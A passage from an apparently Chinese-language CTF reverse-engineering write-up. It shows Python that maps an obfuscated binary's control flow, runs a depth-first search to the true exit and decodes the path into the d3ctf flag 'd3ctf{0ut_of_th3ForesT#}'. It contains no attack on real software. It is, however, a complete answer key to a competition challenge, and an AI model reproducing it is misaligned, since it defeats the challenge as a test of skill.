(<span style="color: rgb(255, 115, 253);">101</span>, <span style="color: rgb(255, 115, 253);">101</span>), (<span style="color: rgb(255, 115, 253);">269</span>, <span style="color: rgb(255, 115, 253);">68</span>), (<span style="color: rgb(255, 115, 253);">169</span>, <span style="color: rgb(255, 115, 253);">182</span>), (<span style="color: rgb(255, 115, 253);">104</span>, <span style="color: rgb(255, 115, 253);">104</span>), (<span style="color: rgb(255, 115, 253);">105</span>, <span style="color: rgb(255, 115, 253);">105</span>), (<span style="color: rgb(255, 115, 253);">154</span>, <span style="color: rgb(255, 115, 253);">50</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">108</span>, <span style="color: rgb(255, 115, 253);">108</span>), (<span style="color: rgb(255, 115, 253);">23</span>, <span style="color: rgb(255, 115, 253);">112</span>), (<span style="color: rgb(255, 115, 253);">140</span>, <span style="color: rgb(255, 115, 253);">99</span>), (<span style="color: rgb(255, 115, 253);">111</span>, <span style="color: rgb(255, 115, 253);">111</span>), (<span style="color: rgb(255, 115, 253);">210</span>, <span style="color: rgb(255, 115, 253);">202</span>), (<span style="color: rgb(255, 115, 253);">113</span>, <span style="color: rgb(255, 115, 253);">113</span>), (<span style="color: rgb(255, 115, 253);">274</span>, <span style="color: rgb(255, 115, 253);">56</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">261</span>, <span style="color: rgb(255, 115, 253);">42</span>), (<span style="color: rgb(255, 115, 253);">118</span>, <span style="color: rgb(255, 115, 253);">118</span>), (<span style="color: rgb(255, 115, 253);">32</span>, <span style="color: rgb(255, 115, 253);">115</span>), (<span style="color: rgb(255, 115, 253);">267</span>, <span style="color: rgb(255, 115, 253);">209</span>), (<span style="color: rgb(255, 115, 253);">121</span>, <span style="color: rgb(255, 115, 253);">121</span>), (<span style="color: rgb(255, 115, 253);">122</span>, <span style="color: rgb(255, 115, 253);">122</span>), (<span style="color: rgb(255, 115, 253);">123</span>, <span style="color: rgb(255, 115, 253);">123</span>), (<span style="color: rgb(255, 115, 253);">231</span>, <span style="color: rgb(255, 115, 253);">256</span>), (<span style="color: rgb(255, 115, 253);">125</span>, <span style="color: rgb(255, 115, 253);">125</span>), (<span style="color: rgb(255, 115, 253);">126</span>, <span style="color: rgb(255, 115, 253);">126</span>), (<span style="color: rgb(255, 115, 253);">57</span>, <span style="color: rgb(255, 115, 253);">206</span>), (<span style="color: rgb(255, 115, 253);">145</span>, <span style="color: rgb(255, 115, 253);">245</span>), (<span style="color: rgb(255, 115, 253);">129</span>, <span style="color: rgb(255, 115, 253);">129</span>), (<span style="color: rgb(255, 115, 253);">130</span>, <span style="color: rgb(255, 115, 253);">130</span>), (<span style="color: rgb(255, 115, 253);">131</span>, <span style="color: rgb(255, 115, 253);">131</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">133</span>, <span style="color: rgb(255, 115, 253);">133</span>), (<span style="color: rgb(255, 115, 253);">155</span>, <span style="color: rgb(255, 115, 253);">162</span>), (<span style="color: rgb(255, 115, 253);">135</span>, <span style="color: rgb(255, 115, 253);">135</span>), (<span style="color: rgb(255, 115, 253);">136</span>, <span style="color: rgb(255, 115, 253);">136</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">140</span>, <span style="color: rgb(255, 115, 253);">140</span>), (<span style="color: rgb(255, 115, 253);">78</span>, <span style="color: rgb(255, 115, 253);">197</span>), (<span style="color: rgb(255, 115, 253);">134</span>, <span style="color: rgb(255, 115, 253);">163</span>), (<span style="color: rgb(255, 115, 253);">200</span>, <span style="color: rgb(255, 115, 253);">103</span>), (<span style="color: rgb(255, 115, 253);">71</span>, <span style="color: rgb(255, 115, 253);">218</span>), (<span style="color: rgb(255, 115, 253);">185</span>, <span style="color: rgb(255, 115, 253);">283</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">139</span>, <span style="color: rgb(255, 115, 253);">34</span>), (<span style="color: rgb(255, 115, 253);">188</span>, <span style="color: rgb(255, 115, 253);">104</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">150</span>, <span style="color: rgb(255, 115, 253);">150</span>), (<span style="color: rgb(255, 115, 253);">151</span>, <span style="color: rgb(255, 115, 253);">151</span>), (<span style="color: rgb(255, 115, 253);">102</span>, <span style="color: rgb(255, 115, 253);">253</span>), (<span style="color: rgb(255, 115, 253);">246</span>, <span style="color: rgb(255, 115, 253);">157</span>), (<span style="color: rgb(255, 115, 253);">154</span>, <span style="color: rgb(255, 115, 253);">154</span>), (<span style="color: rgb(255, 115, 253);">155</span>, <span style="color: rgb(255, 115, 253);">155</span>), <span style="color: rgb(168, 255, 96);">'add     [ebp+57h], ebp'</span>, (<span style="color: rgb(255, 115, 253);">93</span>, <span style="color: rgb(255, 115, 253);">255</span>), (<span style="color: rgb(255, 115, 253);">158</span>, <span style="color: rgb(255, 115, 253);">158</span>), (<span style="color: rgb(255, 115, 253);">38</span>, <span style="color: rgb(255, 115, 253);">144</span>), (<span style="color: rgb(255, 115, 253);">281</span>, <span style="color: rgb(255, 115, 253);">286</span>), (<span style="color: rgb(255, 115, 253);">28</span>, <span style="color: rgb(255, 115, 253);">146</span>), (<span style="color: rgb(255, 115, 253);">186</span>, <span style="color: rgb(255, 115, 253);">285</span>), (<span style="color: rgb(255, 115, 253);">163</span>, <span style="color: rgb(255, 115, 253);">163</span>), (<span style="color: rgb(255, 115, 253);">138</span>, <span style="color: rgb(255, 115, 253);">174</span>), (<span style="color: rgb(255, 115, 253);">69</span>, <span style="color: rgb(255, 115, 253);">37</span>), (<span style="color: rgb(255, 115, 253);">166</span>, <span style="color: rgb(255, 115, 253);">166</span>), (<span style="color: rgb(255, 115, 253);">241</span>, <span style="color: rgb(255, 115, 253);">111</span>), (<span style="color: rgb(255, 115, 253);">168</span>, <span style="color: rgb(255, 115, 253);">168</span>), (<span style="color: rgb(255, 115, 253);">169</span>, <span style="color: rgb(255, 115, 253);">169</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">171</span>, <span style="color: rgb(255, 115, 253);">171</span>), (<span style="color: rgb(255, 115, 253);">58</span>, <span style="color: rgb(255, 115, 253);">148</span>), (<span style="color: rgb(255, 115, 253);">173</span>, <span style="color: rgb(255, 115, 253);">173</span>), (<span style="color: rgb(255, 115, 253);">205</span>, <span style="color: rgb(255, 115, 253);">64</span>), (<span style="color: rgb(255, 115, 253);">175</span>, <span style="color: rgb(255, 115, 253);">175</span>), (<span style="color: rgb(255, 115, 253);">176</span>, <span style="color: rgb(255, 115, 253);">176</span>), (<span style="color: rgb(255, 115, 253);">177</span>, <span style="color: rgb(255, 115, 253);">177</span>), <span style="color: rgb(168, 255, 96);">'add     ds:0F215EE7Ch[edi*8], ecx'</span>, (<span style="color: rgb(255, 115, 253);">181</span>, <span style="color: rgb(255, 115, 253);">75</span>), (<span style="color: rgb(255, 115, 253);">128</span>, <span style="color: rgb(255, 115, 253);">264</span>), (<span style="color: rgb(255, 115, 253);">257</span>, <span style="color: rgb(255, 115, 253);">270</span>), (<span style="color: rgb(255, 115, 253);">160</span>, <span style="color: rgb(255, 115, 253);">176</span>), (<span style="color: rgb(255, 115, 253);">221</span>, <span style="color: rgb(255, 115, 253);">175</span>), (<span style="color: rgb(255, 115, 253);">101</span>, <span style="color: rgb(255, 115, 253);">141</span>), (<span style="color: rgb(255, 115, 253);">220</span>, <span style="color: rgb(255, 115, 253);">47</span>), (<span style="color: rgb(255, 115, 253);">88</span>, <span style="color: rgb(255, 115, 253);">91</span>), (<span style="color: rgb(255, 115, 253);">195</span>, <span style="color: rgb(255, 115, 253);">114</span>), (<span style="color: rgb(255, 115, 253);">158</span>, <span style="color: rgb(255, 115, 253);">247</span>), (<span style="color: rgb(255, 115, 253);">189</span>, <span style="color: rgb(255, 115, 253);">189</span>), (<span style="color: rgb(255, 115, 253);">80</span>, <span style="color: rgb(255, 115, 253);">142</span>), (<span style="color: rgb(255, 115, 253);">287</span>, <span style="color: rgb(255, 115, 253);">133</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">14</span>, <span style="color: rgb(255, 115, 253);">161</span>), (<span style="color: rgb(255, 115, 253);">242</span>, <span style="color: rgb(255, 115, 253);">166</span>), (<span style="color: rgb(255, 115, 253);">195</span>, <span style="color: rgb(255, 115, 253);">195</span>), (<span style="color: rgb(255, 115, 253);">196</span>, <span style="color: rgb(255, 115, 253);">196</span>), (<span style="color: rgb(255, 115, 253);">197</span>, <span style="color: rgb(255, 115, 253);">197</span>), <span style="color: rgb(168, 255, 96);">'add     [edx], edi'</span>, (<span style="color: rgb(255, 115, 253);">131</span>, <span style="color: rgb(255, 115, 253);">65</span>), (<span style="color: rgb(255, 115, 253);">200</span>, <span style="color: rgb(255, 115, 253);">200</span>), (<span style="color: rgb(255, 115, 253);">190</span>, <span style="color: rgb(255, 115, 253);">130</span>), (<span style="color: rgb(255, 115, 253);">199</span>, <span style="color: rgb(255, 115, 253);">96</span>), (<span style="color: rgb(255, 115, 253);">183</span>, <span style="color: rgb(255, 115, 253);">105</span>), (<span style="color: rgb(255, 115, 253);">204</span>, <span style="color: rgb(255, 115, 253);">204</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">35</span>, <span style="color: rgb(255, 115, 253);">74</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">168</span>, <span style="color: rgb(255, 115, 253);">109</span>), (<span style="color: rgb(255, 115, 253);">209</span>, <span style="color: rgb(255, 115, 253);">209</span>), (<span style="color: rgb(255, 115, 253);">210</span>, <span style="color: rgb(255, 115, 253);">210</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">213</span>, <span style="color: rgb(255, 115, 253);">213</span>), (<span style="color: rgb(255, 115, 253);">239</span>, <span style="color: rgb(255, 115, 253);">108</span>), (<span style="color: rgb(255, 115, 253);">215</span>, <span style="color: rgb(255, 115, 253);">215</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">217</span>, <span style="color: rgb(255, 115, 253);">217</span>), (<span style="color: rgb(255, 115, 253);">218</span>, <span style="color: rgb(255, 115, 253);">218</span>), (<span style="color: rgb(255, 115, 253);">219</span>, <span style="color: rgb(255, 115, 253);">219</span>), (<span style="color: rgb(255, 115, 253);">220</span>, <span style="color: rgb(255, 115, 253);">220</span>), (<span style="color: rgb(255, 115, 253);">136</span>, <span style="color: rgb(255, 115, 253);">10</span>), (<span style="color: rgb(255, 115, 253);">222</span>, <span style="color: rgb(255, 115, 253);">222</span>), (<span style="color: rgb(255, 115, 253);">107</span>, <span style="color: rgb(255, 115, 253);">266</span>), (<span style="color: rgb(255, 115, 253);">66</span>, <span style="color: rgb(255, 115, 253);">273</span>), (<span style="color: rgb(255, 115, 253);">1</span>, <span style="color: rgb(255, 115, 253);">21</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">227</span>, <span style="color: rgb(255, 115, 253);">227</span>), (<span style="color: rgb(255, 115, 253);">228</span>, <span style="color: rgb(255, 115, 253);">228</span>), (<span style="color: rgb(255, 115, 253);">263</span>, <span style="color: rgb(255, 115, 253);">170</span>), (<span style="color: rgb(255, 115, 253);">5</span>, <span style="color: rgb(255, 115, 253);">191</span>), (<span style="color: rgb(255, 115, 253);">62</span>, <span style="color: rgb(255, 115, 253);">46</span>), (<span style="color: rgb(255, 115, 253);">232</span>, <span style="color: rgb(255, 115, 253);">232</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">103</span>, <span style="color: rgb(255, 115, 253);">36</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">236</span>, <span style="color: rgb(255, 115, 253);">236</span>), (<span style="color: rgb(255, 115, 253);">184</span>, <span style="color: rgb(255, 115, 253);">2</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">98</span>, <span style="color: rgb(255, 115, 253);">137</span>), (<span style="color: rgb(255, 115, 253);">126</span>, <span style="color: rgb(255, 115, 253);">277</span>), (<span style="color: rgb(255, 115, 253);">217</span>, <span style="color: rgb(255, 115, 253);">250</span>), (<span style="color: rgb(255, 115, 253);">172</span>, <span style="color: rgb(255, 115, 253);">228</span>), (<span style="color: rgb(255, 115, 253);">102</span>, <span style="color: rgb(255, 115, 253);">70</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">245</span>, <span style="color: rgb(255, 115, 253);">245</span>), (<span style="color: rgb(255, 115, 253);">246</span>, <span style="color: rgb(255, 115, 253);">246</span>), (<span style="color: rgb(255, 115, 253);">17</span>, <span style="color: rgb(255, 115, 253);">86</span>), (<span style="color: rgb(255, 115, 253);">248</span>, <span style="color: rgb(255, 115, 253);">248</span>), (<span style="color: rgb(255, 115, 253);">104</span>, <span style="color: rgb(255, 115, 253);">38</span>), (<span style="color: rgb(255, 115, 253);">83</span>, <span style="color: rgb(255, 115, 253);">268</span>), (<span style="color: rgb(255, 115, 253);">39</span>, <span style="color: rgb(255, 115, 253);">187</span>), (<span style="color: rgb(255, 115, 253);">270</span>, <span style="color: rgb(255, 115, 253);">128</span>), (<span style="color: rgb(255, 115, 253);">253</span>, <span style="color: rgb(255, 115, 253);">253</span>), (<span style="color: rgb(255, 115, 253);">22</span>, <span style="color: rgb(255, 115, 253);">149</span>), (<span style="color: rgb(255, 115, 253);">4</span>, <span style="color: rgb(255, 115, 253);">94</span>), (<span style="color: rgb(255, 115, 253);">256</span>, <span style="color: rgb(255, 115, 253);">256</span>), (<span style="color: rgb(255, 115, 253);">257</span>, <span style="color: rgb(255, 115, 253);">257</span>), (<span style="color: rgb(255, 115, 253);">222</span>, <span style="color: rgb(255, 115, 253);">84</span>), (<span style="color: rgb(255, 115, 253);">215</span>, <span style="color: rgb(255, 115, 253);">288</span>), (<span style="color: rgb(255, 115, 253);">260</span>, <span style="color: rgb(255, 115, 253);">260</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">254</span>, <span style="color: rgb(255, 115, 253);">248</span>), (<span style="color: rgb(255, 115, 253);">164</span>, <span style="color: rgb(255, 115, 253);">132</span>), (<span style="color: rgb(255, 115, 253);">264</span>, <span style="color: rgb(255, 115, 253);">264</span>), (<span style="color: rgb(255, 115, 253);">54</span>, <span style="color: rgb(255, 115, 253);">262</span>), (<span style="color: rgb(255, 115, 253);">33</span>, <span style="color: rgb(255, 115, 253);">9</span>), (<span style="color: rgb(255, 115, 253);">253</span>, <span style="color: rgb(255, 115, 253);">18</span>), (<span style="color: rgb(255, 115, 253);">213</span>, <span style="color: rgb(255, 115, 253);">203</span>), (<span style="color: rgb(255, 115, 253);">30</span>, <span style="color: rgb(255, 115, 253);">97</span>), (<span style="color: rgb(255, 115, 253);">40</span>, <span style="color: rgb(255, 115, 253);">227</span>), (<span style="color: rgb(255, 115, 253);">271</span>, <span style="color: rgb(255, 115, 253);">271</span>), (<span style="color: rgb(255, 115, 253);">79</span>, <span style="color: rgb(255, 115, 253);">127</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">274</span>, <span style="color: rgb(255, 115, 253);">274</span>), (<span style="color: rgb(255, 115, 253);">131</span>, <span style="color: rgb(255, 115, 253);">241</span>), (<span style="color: rgb(255, 115, 253);">212</span>, <span style="color: rgb(255, 115, 253);">63</span>), (<span style="color: rgb(255, 115, 253);">77</span>, <span style="color: rgb(255, 115, 253);">143</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), (<span style="color: rgb(255, 115, 253);">121</span>, <span style="color: rgb(255, 115, 253);">110</span>), (<span style="color: rgb(255, 115, 253);">124</span>, <span style="color: rgb(255, 115, 253);">150</span>), (<span style="color: rgb(255, 115, 253);">281</span>, <span style="color: rgb(255, 115, 253);">281</span>), (<span style="color: rgb(255, 115, 253);">282</span>, <span style="color: rgb(255, 115, 253);">282</span>), (-<span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>), <span style="color: rgb(168, 255, 96);">'add     edi, esp'</span>, (<span style="color: rgb(255, 115, 253);">285</span>, <span style="color: rgb(255, 115, 253);">285</span>), (<span style="color: rgb(255, 115, 253);">51</span>, <span style="color: rgb(255, 115, 253);">29</span>), (<span style="color: rgb(255, 115, 253);">282</span>, <span style="color: rgb(255, 115, 253);">208</span>), (<span style="color: rgb(255, 115, 253);">159</span>, <span style="color: rgb(255, 115, 253);">177</span>)]<br /><span style="color: rgb(150, 203, 254);">for</span> i <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">0x121</span>):<br />    <span style="color: rgb(150, 203, 254);">if</span> (type(op_ls[i]) != str):<br />        <span style="color: rgb(150, 203, 254);">continue</span><br />    <span style="color: rgb(150, 203, 254);">for</span> j <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">0x121</span>):<br />        <span style="color: rgb(150, 203, 254);">if</span> (type(op_ls[j]) == str):<br />            <span style="color: rgb(150, 203, 254);">continue</span><br />        <span style="color: rgb(150, 203, 254);">if</span> (i <span style="color: rgb(150, 203, 254);">in</span> op_ls[j]):<br />            print(<span style="color: rgb(168, 255, 96);">f"[<span style="color: rgb(218, 239, 163);">{i}</span>]: <span style="color: rgb(218, 239, 163);">{op_ls[i]}</span>"</span>)<br />            <span style="color: rgb(150, 203, 254);">break</span></code></pre><p>真出口在<code style="font-family: SFMono-Regular, Consolas, ;">[27] mov eax, 1; mov dword ptr [eax], 39393939h</code></p><p>dfs走迷宫找出口记录路径</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">dfs</span>(cur, path=[]):<br />    <span style="color: rgb(146, 255, 184);"># print(cur, path)</span><br />    <span style="color: rgb(150, 203, 254);">if</span> (cur == <span style="color: rgb(255, 115, 253);">27</span>):        print(path)<br />        <span style="color: rgb(150, 203, 254);">return</span><br />    <span style="color: rgb(150, 203, 254);">elif</span> (type(op_ls[cur]) == str):<br />        <span style="color: rgb(150, 203, 254);">return</span><br />    l = op_ls[cur][<span style="color: rgb(255, 115, 253);">0</span>]<br />    <span style="color: rgb(150, 203, 254);">if</span> (l != -<span style="color: rgb(255, 115, 253);">1</span> <span style="color: rgb(150, 203, 254);">and</span> l <span style="color: rgb(150, 203, 254);">not</span> <span style="color: rgb(150, 203, 254);">in</span> path):        new_path = path.copy()        new_path.append(cur)        dfs(l, new_path)<br />    r = op_ls[cur][<span style="color: rgb(255, 115, 253);">1</span>]<br />    <span style="color: rgb(150, 203, 254);">if</span> (r != -<span style="color: rgb(255, 115, 253);">1</span> <span style="color: rgb(150, 203, 254);">and</span> r <span style="color: rgb(150, 203, 254);">not</span> <span style="color: rgb(150, 203, 254);">in</span> path):        new_path = path.copy()        new_path.append(cur)        dfs(r, new_path)<br />dfs(<span style="color: rgb(255, 115, 253);">0</span>, [])</code></pre><p>只有一条路，长度正好是<code style="font-family: SFMono-Regular, Consolas, ;">17 * 8</code>，把路径转换为flag</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">path = [<span style="color: rgb(255, 115, 253);">11</span>, <span style="color: rgb(255, 115, 253);">82</span>, <span style="color: rgb(255, 115, 253);">26</span>, <span style="color: rgb(255, 115, 253);">224</span>, <span style="color: rgb(255, 115, 253);">66</span>, <span style="color: rgb(255, 115, 253);">100</span>, <span style="color: rgb(255, 115, 253);">229</span>, <span style="color: rgb(255, 115, 253);">263</span>, <span style="color: rgb(255, 115, 253);">164</span>, <span style="color: rgb(255, 115, 253);">174</span>, <span style="color: rgb(255, 115, 253);">64</span>, <span style="color: rgb(255, 115, 253);">6</span>, <span style="color: rgb(255, 115, 253);">193</span>, <span style="color: rgb(255, 115, 253);">161</span>, <span style="color: rgb(255, 115, 253);">28</span>, <span style="color: rgb(255, 115, 253);">61</span>, <span style="color: rgb(255, 115, 253);">223</span>, <span style="color: rgb(255, 115, 253);">266</span>, <span style="color: rgb(255, 115, 253);">9</span>, <span style="color: rgb(255, 115, 253);">13</span>, <span style="color: rgb(255, 115, 253);">8</span>, <span style="color: rgb(255, 115, 253);">43</span>, <span style="color: rgb(255, 115, 253);">16</span>, <span style="color: rgb(255, 115, 253);">72</span>, <span style="color: rgb(255, 115, 253);">258</span>, <span style="color: rgb(255, 115, 253);">84</span>, <span style="color: rgb(255, 115, 253);">117</span>, <span style="color: rgb(255, 115, 253);">42</span>, <span style="color: rgb(255, 115, 253);">251</span>, <span style="color: rgb(255, 115, 253);">187</span>, <span style="color: rgb(255, 115, 253);">114</span>, <span style="color: rgb(255, 115, 253);">56</span>, <span style="color: rgb(255, 115, 253);">20</span>, <span style="color: rgb(255, 115, 253);">230</span>, <span style="color: rgb(255, 115, 253);">191</span>, <span style="color: rgb(255, 115, 253);">287</span>, <span style="color: rgb(255, 115, 253);">208</span>, <span style="color: rgb(255, 115, 253);">109</span>, <span style="color: rgb(255, 115, 253);">112</span>, <span style="color: rgb(255, 115, 253);">202</span>, <span style="color: rgb(255, 115, 253);">199</span>, <span style="color: rgb(255, 115, 253);">65</span>, <span style="color: rgb(255, 115, 253);">214</span>, <span style="color: rgb(255, 115, 253);">239</span>, <span style="color: rgb(255, 115, 253);">98</span>, <span style="color: rgb(255, 115, 253);">225</span>, <span style="color: rgb(255, 115, 253);">21</span>, <span style="color: rgb(255, 115, 253);">237</span>, <span style="color: rgb(255, 115, 253);">184</span>, <span style="color: rgb(255, 115, 253);">141</span>, <span style="color: rgb(255, 115, 253);">78</span>, <span style="color: rgb(255, 115, 253);">240</span>, <span style="color: rgb(255, 115, 253);">277</span>, <span style="color: rgb(255, 115, 253);">143</span>, <span style="color: rgb(255, 115, 253);">103</span>, <span style="color: rgb(255, 115, 253);">182</span>, <span style="color: rgb(255, 115, 253);">160</span>, <span style="color: rgb(255, 115, 253);">286</span>, <span style="color: rgb(255, 115, 253);">29</span>, <span style="color: rgb(255, 115, 253);">179</span>, <span style="color: rgb(255, 115, 253);">181</span>, <span style="color: rgb(255, 115, 253);">270</span>, <span style="color: rgb(255, 115, 253);">40</span>, <span style="color: rgb(255, 115, 253);">48</span>, <span style="color: rgb(255, 115, 253);">45</span>, <span style="color: rgb(255, 115, 253);">165</span>, <span style="color: rgb(255, 115, 253);">37</span>, <span style="color: rgb(255, 115, 253);">276</span>, <span style="color: rgb(255, 115, 253);">63</span>, <span style="color: rgb(255, 115, 253);">55</span>, <span style="color: rgb(255, 115, 253);">280</span>, <span style="color: rgb(255, 115, 253);">124</span>, <span style="color: rgb(255, 115, 253);">231</span>, <span style="color: rgb(255, 115, 253);">62</span>, <span style="color: rgb(255, 115, 253);">265</span>, <span style="color: rgb(255, 115, 253);">262</span>, <span style="color: rgb(255, 115, 253);">254</span>, <span style="color: rgb(255, 115, 253);">22</span>, <span style="color: rgb(255, 115, 253);">190</span>, <span style="color: rgb(255, 115, 253);">142</span>, <span style="color: rgb(255, 115, 253);">134</span>, <span style="color: rgb(255, 115, 253);">162</span>, <span style="color: rgb(255, 115, 253);">186</span>, <span style="color: rgb(255, 115, 253);">88</span>, <span style="color: rgb(255, 115, 253);">106</span>, <span style="color: rgb(255, 115, 253);">50</span>, <span style="color: rgb(255, 115, 253);">92</span>, <span style="color: rgb(255, 115, 253);">119</span>, <span style="color: rgb(255, 115, 253);">32</span>, <span style="color: rgb(255, 115, 253);">147</span>, <span style="color: rgb(255, 115, 253);">34</span>, <span style="color: rgb(255, 115, 253);">153</span>, <span style="color: rgb(255, 115, 253);">157</span>, <span style="color: rgb(255, 115, 253);">255</span>, <span style="color: rgb(255, 115, 253);">94</span>, <span style="color: rgb(255, 115, 253);">167</span>, <span style="color: rgb(255, 115, 253);">241</span>, <span style="color: rgb(255, 115, 253);">250</span>, <span style="color: rgb(255, 115, 253);">268</span>, <span style="color: rgb(255, 115, 253);">203</span>, <span style="color: rgb(255, 115, 253);">183</span>, <span style="color: rgb(255, 115, 253);">221</span>, <span style="color: rgb(255, 115, 253);">10</span>, <span style="color: rgb(255, 115, 253);">120</span>, <span style="color: rgb(255, 115, 253);">267</span>, <span style="color: rgb(255, 115, 253);">18</span>, <span style="color: rgb(255, 115, 253);">194</span>, <span style="color: rgb(255, 115, 253);">242</span>, <span style="color: rgb(255, 115, 253);">172</span>, <span style="color: rgb(255, 115, 253);">148</span>, <span style="color: rgb(255, 115, 253);">188</span>, <span style="color: rgb(255, 115, 253);">247</span>, <span style="color: rgb(255, 115, 253);">17</span>, <span style="color: rgb(255, 115, 253);">272</span>, <span style="color: rgb(255, 115, 253);">127</span>, <span style="color: rgb(255, 115, 253);">206</span>, <span style="color: rgb(255, 115, 253);">35</span>, <span style="color: rgb(255, 115, 253);">279</span>, <span style="color: rgb(255, 115, 253);">110</span>, <span style="color: rgb(255, 115, 253);">99</span>, <span style="color: rgb(255, 115, 253);">259</span>, <span style="color: rgb(255, 115, 253);">288</span>, <span style="color: rgb(255, 115, 253);">159</span>, <span style="color: rgb(255, 115, 253);">144</span>, <span style="color: rgb(255, 115, 253);">71</span>, <span style="color: rgb(255, 115, 253);">24</span>, <span style="color: rgb(255, 115, 253);">243</span>, <span style="color: rgb(255, 115, 253);">102</span>, <span style="color: rgb(255, 115, 253);">269</span>, <span style="color: rgb(255, 115, 253);">30</span>, <span style="color: rgb(255, 115, 253);">180</span>, <span style="color: rgb(255, 115, 253);">128</span>, <span style="color: rgb(255, 115, 253);">145</span>, <span style="color: rgb(255, 115, 253);">185</span>, <span style="color: rgb(255, 115, 253);">47</span>, <span style="color: rgb(255, 115, 253);">27</span>]<br />last = <span style="color: rgb(255, 115, 253);">0</span><br />flag = <span style="color: rgb(168, 255, 96);">""</span><br /><span style="color: rgb(150, 203, 254);">for</span> cur <span style="color: rgb(150, 203, 254);">in</span> path:<br />    <span style="color: rgb(150, 203, 254);">if</span> (cur == op_ls[last][<span style="color: rgb(255, 115, 253);">0</span>]):<br />        flag += <span style="color: rgb(168, 255, 96);">"0"</span><br />    <span style="color: rgb(150, 203, 254);">else</span>:<br />        flag += <span style="color: rgb(168, 255, 96);">"1"</span>    last = cur<br />print(int(flag, <span style="color: rgb(255, 115, 253);">2</span>).to_bytes(<span style="color: rgb(255, 115, 253);">17</span>))<br /><span style="color: rgb(146, 255, 184);"># d3ctf{0ut_of_th3ForesT#}</span></code></pre><p>最后得到题目flag<code style="font-family: SFMono-Regular, Consolas, ;">d3ctf{0ut_of_th3ForesT#}</code></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: 